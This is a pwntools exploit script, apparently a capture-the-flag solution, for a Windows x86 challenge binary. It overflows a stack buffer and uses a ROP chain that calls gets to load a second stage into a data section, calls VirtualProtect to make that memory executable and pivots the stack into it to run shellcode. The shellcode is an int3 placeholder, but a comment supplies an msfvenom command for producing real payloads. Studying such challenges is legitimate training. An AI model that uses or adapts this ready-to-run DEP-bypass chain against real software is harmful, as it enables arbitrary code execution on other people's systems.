#!/usr/bin/env python3
from pwn import *

context.arch = "i386"
context.os = "windows"

exe = "./chall.exe"

OFFSET      = 0x84
SAVED_EBP   = 0x80

GETS        = 0x4064f5
POP_ECX_RET = 0x4064f3
CALL_VP     = 0x408159

DATA        = 0x41d500
OLDPROTECT  = 0x41d100

PAGE_EXECUTE_READWRITE = 0x40

# For local testing, replace this with real Windows x86 shellcode.
# Example:
# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b '\x0a' -f python
shellcode = b"\xcc"   # int3 breakpoint for debugger testing

stage2  = p32(0x41414141)     # fake EBP
stage2 += p32(DATA + 8)       # ret target after leave; ret
stage2 += shellcode

payload  = b"A" * SAVED_EBP

# This value becomes EBP after vuln() epilogue.
# Later, 0x408164 does leave; ret, so it pivots into DATA.
payload += p32(DATA)

# First call gets(DATA)
payload += p32(GETS)
payload += p32(POP_ECX_RET)   # clean gets argument
payload += p32(DATA)

# Then call VirtualProtect via call dword ptr [IAT]
payload += p32(CALL_VP)

# Arguments for VirtualProtect.
# When CALL_VP executes, it pushes 0x40815f as the return address,
# so these become the real function arguments.
payload += p32(DATA)                  # lpAddress
payload += p32(0x1000)                # dwSize
payload += p32(PAGE_EXECUTE_READWRITE)# flNewProtect
payload += p32(OLDPROTECT)            # lpflOldProtect

# Local Windows process:
# p = process(exe)

# Remote example:
# p = remote("host", port)

p = process(exe)

p.recvuntil(b"Enter data:")
p.sendline(payload)

# Program prints "You entered: ..."
# Then our ROP calls gets(DATA), so send stage 2.
p.sendline(stage2)

p.interactive()